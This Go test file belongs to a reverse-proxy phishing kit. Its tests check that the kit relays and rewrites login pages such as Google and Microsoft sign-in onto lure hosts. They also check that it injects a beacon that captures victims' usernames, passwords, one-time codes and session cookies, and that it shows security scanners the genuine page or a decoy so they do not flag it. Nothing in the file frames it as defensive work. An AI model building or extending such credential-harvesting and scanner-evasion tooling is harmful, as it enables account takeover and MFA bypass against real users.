package phish

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func newTestManager(t *testing.T) (*Manager, string) {
	t.Helper()
	dir := t.TempDir()
	m, err := NewManager(dir)
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	return m, dir
}

func TestManagerCreateListPersist(t *testing.T) {
	m, dir := newTestManager(t)
	site, err := m.CreateSite(SiteInput{
		Label: "unit", TargetURL: "accounts.google.com/SignIn",
		Hosts: []string{"signin.example.net"},
	})
	if err != nil {
		t.Fatalf("CreateSite: %v", err)
	}
	if !strings.HasPrefix(site.ID, "ph_") {
		t.Fatalf("site id: %q", site.ID)
	}
	if site.TargetURL != "https://accounts.google.com/SignIn" {
		t.Fatalf("target normalized: %q", site.TargetURL)
	}
	if site.Mode != ModeProxy || site.BotAction != BotNone || !site.Enabled {
		t.Fatalf("defaults: %+v", site)
	}
	// Host conflicts are rejected.
	if _, err := m.CreateSite(SiteInput{TargetURL: "https://login.microsoftonline.com", Hosts: []string{"signin.example.net"}}); err == nil {
		t.Fatal("expected host conflict error")
	}
	// Persistence round-trip.
	if _, err := m.Enable(site.ID, false); err != nil {
		t.Fatalf("Enable: %v", err)
	}
	m2, err := NewManager(dir)
	if err != nil {
		t.Fatalf("reload: %v", err)
	}
	got, ok := m2.Get(site.ID)
	if !ok || got.Enabled {
		t.Fatalf("persistence lost/disabled state wrong: %+v ok=%v", got, ok)
	}
	if _, ok := m2.ByHost("signin.example.net"); ok {
		t.Fatal("disabled site must not answer")
	}
	if err := m2.Delete(site.ID); err != nil {
		t.Fatalf("Delete: %v", err)
	}
	if _, ok := m2.Get(site.ID); ok {
		t.Fatal("site not deleted")
	}
}

func TestBotFilterDefaults(t *testing.T) {
	m, _ := newTestManager(t)
	site, err := m.CreateSite(SiteInput{
		TargetURL: "https://login.example.com",
		Hosts:     []string{"portal.example.net"},
		BotAction: BotPassthrough,
	})
	if err != nil {
		t.Fatalf("CreateSite: %v", err)
	}
	if len(site.BotUA) == 0 {
		t.Fatal("default bot UA list not applied")
	}
	req := httptest.NewRequest("GET", "http://portal.example.net/", nil)
	req.Header.Set("User-Agent", "HeadlessChrome/120")
	if !matchBot(site, req) {
		t.Fatal("headless UA not matched")
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh) Chrome/126 Safari/537.36")
	if matchBot(site, req) {
		t.Fatal("human UA matched")
	}
	// CIDR filter with an explicit UA list that never matches (IP-only mode).
	site2, err := m.CreateSite(SiteInput{
		TargetURL: "https://login.example.com", Hosts: []string{"p2.example.net"},
		BotAction: BotBlock, BotUA: []string{"never-matches-any-ua-xyz"}, BotIPs: []string{"10.9.0.0/16"},
	})
	if err != nil {
		t.Fatalf("CreateSite2: %v", err)
	}
	if len(site2.BotUA) != 1 {
		t.Fatal("explicit bot UA list must be preserved")
	}
	req2 := httptest.NewRequest("GET", "http://p2.example.net/", nil)
	req2.RemoteAddr = "10.9.3.4:5555"
	if !matchBot(site2, req2) {
		t.Fatal("CIDR not matched")
	}
	req2.RemoteAddr = "10.10.3.4:5555"
	if matchBot(site2, req2) {
		t.Fatal("outside CIDR matched")
	}
}

// __TEST_PART2__

func TestProxyRewriteAndCapture(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		self := "http://" + r.Host
		switch r.URL.Path {
		case "/login":
			w.Header().Set("Content-Type", "text/html")
			http.SetCookie(w, &http.Cookie{Name: "SESSID", Value: "abc123", Domain: r.Host, Path: "/"})
			fmt.Fprintf(w, `<html><body><form action="%s/submit" method="post">`+
				`<img src="%s/logo.png">`+
				`<input name="email"><input type="password" name="pass"></form></body></html>`, self, self)
		case "/submit":
			w.Header().Set("Location", self+"/sso?next=/home")
			w.WriteHeader(http.StatusFound)
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer upstream.Close()
	upURL := strings.TrimPrefix(upstream.URL, "http://") // host:port

	m, _ := newTestManager(t)
	site, err := m.CreateSite(SiteInput{
		TargetURL: "http://" + upURL,
		Hosts:     []string{"phish.example.net"},
		Capture:   true,
	})
	if err != nil {
		t.Fatalf("CreateSite: %v", err)
	}
	h := &Handler{M: m}

	// Victim request: rewritten + injected.
	req := httptest.NewRequest("GET", "http://phish.example.net/login", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != 200 {
		t.Fatalf("proxy status: %d body=%s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if strings.Contains(body, upURL) {
		t.Fatalf("upstream host leaked into body: %s", body)
	}
	if !strings.Contains(body, "http://phish.example.net/submit") || !strings.Contains(body, "//phish.example.net") {
		t.Fatalf("rewrite missing: %s", body)
	}
	if !strings.Contains(body, "data-bhm=\""+site.ID+"\"") || !strings.Contains(body, "/__bhm/collect") {
		t.Fatalf("capture beacon missing: %s", body)
	}
	cookies := rec.Result().Cookies()
	if len(cookies) != 1 || cookies[0].Domain != "" {
		t.Fatalf("cookie domain not stripped: %+v", cookies)
	}

	// Redirect rewriting.
	req2 := httptest.NewRequest("POST", "http://phish.example.net/submit", nil)
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if loc := rec2.Header().Get("Location"); loc != "http://phish.example.net/sso?next=/home" {
		t.Fatalf("location not rewritten: %q", loc)
	}

	// Beacon capture.
	payload, _ := json.Marshal(collectPayload{
		URL: "http://phish.example.net/login",
		Fields: map[string]string{
			"email": "victim@example.com", "pass": "hunter2", "otp": "123456",
		},
		Cookies: []Cookie{{Name: "SESSID", Value: "abc123"}, {Name: "PREF", Value: "x"}},
	})
	req3 := httptest.NewRequest("POST", "http://phish.example.net/__bhm/collect", strings.NewReader(string(payload)))
	rec3 := httptest.NewRecorder()
	h.ServeHTTP(rec3, req3)
	if rec3.Code != 204 {
		t.Fatalf("collect status: %d", rec3.Code)
	}
	caps := m.Captures("", 10)
	if len(caps) != 1 {
		t.Fatalf("captures: %d", len(caps))
	}
	c := caps[0]
	if c.Username != "victim@example.com" || c.Password != "hunter2" {
		t.Fatalf("credentials wrong: %q/%q", c.Username, c.Password)
	}
	if len(c.Cookies) != 1 || c.Cookies[0].Name != "SESSID" {
		t.Fatalf("session cookie filter: %+v", c.Cookies)
	}
	if c.SiteID != site.ID {
		t.Fatalf("capture binding: %+v", c)
	}
}

func TestBotPassthroughServesGenuinePage(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, `<html><body>genuine login <a href="http://%s/help">help</a></body></html>`, r.Host)
	}))
	defer upstream.Close()

	m, _ := newTestManager(t)
	if _, err := m.CreateSite(SiteInput{
		TargetURL: upstream.URL, Hosts: []string{"scan.example.net"},
		BotAction: BotPassthrough,
	}); err != nil {
		t.Fatalf("CreateSite: %v", err)
	}
	h := &Handler{M: m}

	// Scanner sees the byte-for-byte genuine page (no rewriting/beacon).
	req := httptest.NewRequest("GET", "http://scan.example.net/", nil)
	req.Header.Set("User-Agent", "python-requests/2.31")
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if strings.Contains(rec.Body.String(), "scan.example.net") || strings.Contains(rec.Body.String(), "data-bhm") {
		t.Fatalf("scanner page was rewritten: %s", rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "127.0.0.1") && !strings.Contains(rec.Body.String(), "127.0.0.1:") {
		// upstream host references must remain untouched for scanners
		if !strings.Contains(rec.Body.String(), "/help") {
			t.Fatalf("scanner page unexpected: %s", rec.Body.String())
		}
	}
	// A human still gets the rewritten relay.
	req2 := httptest.NewRequest("GET", "http://scan.example.net/", nil)
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0) Chrome/126")
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if strings.Contains(rec2.Body.String(), "127.0.0.1") {
		t.Fatalf("human page keeps upstream host: %s", rec2.Body.String())
	}
	if !strings.Contains(rec2.Body.String(), "scan.example.net/help") {
		t.Fatalf("human page not rewritten: %s", rec2.Body.String())
	}
}

func TestBotBlockAndDecoy(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte("<html><body>secret kit</body></html>"))
	}))
	defer upstream.Close()

	m, _ := newTestManager(t)
	if _, err := m.CreateSite(SiteInput{
		TargetURL: upstream.URL, Hosts: []string{"block.example.net"}, BotAction: BotBlock,
	}); err != nil {
		t.Fatalf("create: %v", err)
	}
	if _, err := m.CreateSite(SiteInput{
		TargetURL: upstream.URL, Hosts: []string{"decoy.example.net"}, BotAction: BotDecoy,
		DecoyHTML: "<html><body>harmless</body></html>",
	}); err != nil {
		t.Fatalf("create: %v", err)
	}
	h := &Handler{M: m}
	scanReq := func(host string) *http.Request {
		req := httptest.NewRequest("GET", "http://x/", nil)
		req.Header.Set("User-Agent", "curl/8.4")
		req.Host = host
		return req
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, scanReq("block.example.net"))
	if rec.Code != http.StatusNotFound {
		t.Fatalf("block status: %d", rec.Code)
	}
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, scanReq("decoy.example.net"))
	if !strings.Contains(rec2.Body.String(), "harmless") {
		t.Fatalf("decoy not served: %s", rec2.Body.String())
	}
}

func TestUnknownHostAndCaptureFilePersistence(t *testing.T) {
	m, dir := newTestManager(t)
	h := &Handler{M: m}
	req := httptest.NewRequest("GET", "http://nope.example.net/", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("unknown host status: %d", rec.Code)
	}

	site, err := m.CreateSite(SiteInput{TargetURL: "https://t.example", Label: "L"})
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	m.RecordCapture(Capture{SiteID: site.ID, Username: "u", Password: "p"})
	raw, err := os.ReadFile(filepath.Join(dir, "captures.jsonl"))
	if err != nil {
		t.Fatalf("captures file: %v", err)
	}
	if !strings.Contains(string(raw), `"username":"u"`) {
		t.Fatalf("capture not persisted: %s", raw)
	}
	m2, err := NewManager(dir)
	if err != nil {
		t.Fatalf("reload: %v", err)
	}
	if got := m2.Captures("", 5); len(got) != 1 || got[0].ID != 1 {
		t.Fatalf("capture reload: %+v", got)
	}
}
